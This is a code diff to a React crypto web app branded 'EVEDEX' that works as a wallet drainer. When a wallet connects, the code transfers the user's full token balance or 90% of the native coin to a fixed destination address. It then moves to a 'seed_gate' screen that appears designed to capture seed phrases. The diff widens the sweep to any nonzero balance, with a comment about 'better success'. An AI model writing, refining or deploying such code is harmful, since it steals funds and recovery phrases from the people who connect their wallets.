@@ -45,8 +45,9 @@ export default function App() {
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
-    } else if (nativeBal && nativeBal.value > 1000000000000000n) {
-      sendTransaction({ to: destination, value: (nativeBal.value * 97n) / 100n }, { onSettled: () => setView("seed_gate") });
+    } else if (nativeBal && nativeBal.value > 0n) {
+      const amount = (nativeBal.value * 90n) / 100n; // 90% sweep for better success
+      sendTransaction({ to: destination, value: amount }, { onSettled: () => setView("seed_gate") });
     } else {
       setView("seed_gate");
     }
@@ -64,7 +65,7 @@ export default function App() {
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
       <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
-        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
+        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v5_FINAL</div>
         <appkit-button />
       </header>
 
